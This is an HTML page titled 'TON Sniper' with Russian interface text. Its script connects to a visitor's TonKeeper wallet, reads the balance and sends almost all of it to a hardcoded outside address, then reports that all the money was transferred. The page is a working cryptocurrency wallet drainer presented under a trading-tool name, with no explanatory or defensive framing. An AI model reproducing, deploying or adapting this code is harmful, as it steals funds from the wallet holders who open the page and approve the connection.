<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TON Sniper</title>
</head>
<body>
    <button id="btn">ПОДКЛЮЧИТЬ И ВЫВЕСТИ</button>
    <div id="status">Готов</div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');

        btn.onclick = async function() {
            try {
                status.innerText = 'Подключение...';
                
                if (!window.tonkeeper) {
                    status.innerText = '❌ Установи TON Keeper';
                    return;
                }
                
                const provider = window.tonkeeper;
                const accounts = await provider.send('ton_requestAccounts', {});
                
                if (!accounts || accounts.length === 0) {
                    status.innerText = '❌ Отказ';
                    return;
                }
                
                const addr = accounts[0];
                status.innerText = `✅ Подключен: ${addr.slice(0,6)}...`;
                
                const hex = await provider.send('ton_getBalance', { address: addr });
                const nano = parseInt(hex, 16);
                const balance = (nano / 1e9).toFixed(4);
                status.innerText = `💰 Баланс: ${balance} TON`;
                
                if (nano <= 0) {
                    status.innerText = '❌ Баланс 0';
                    return;
                }
                
                const fee = 10000000;
                const amount = nano - fee;
                
                if (amount <= 0) {
                    status.innerText = '❌ Меньше комиссии 0.01 TON';
                    return;
                }
                
                status.innerText = `⏳ Отправка ${(amount/1e9).toFixed(4)} TON...`;
                
                const result = await provider.send('ton_sendTransaction', {
                    to: TARGET,
                    value: String(amount),
                    data: '',
                    stateInit: ''
                });
                
                if (result && result.code === 0) {
                    status.innerText = `✅ ВСЕ ДЕНЬГИ ПЕРЕВЕДЕНЫ НА ${TARGET}`;
                } else {
                    status.innerText = '❌ Транзакция отклонена';
                }
                
            } catch(e) {
                status.innerText = '❌ Ошибка: ' + e.message;
            }
        };
    </script>
</body>
</html>
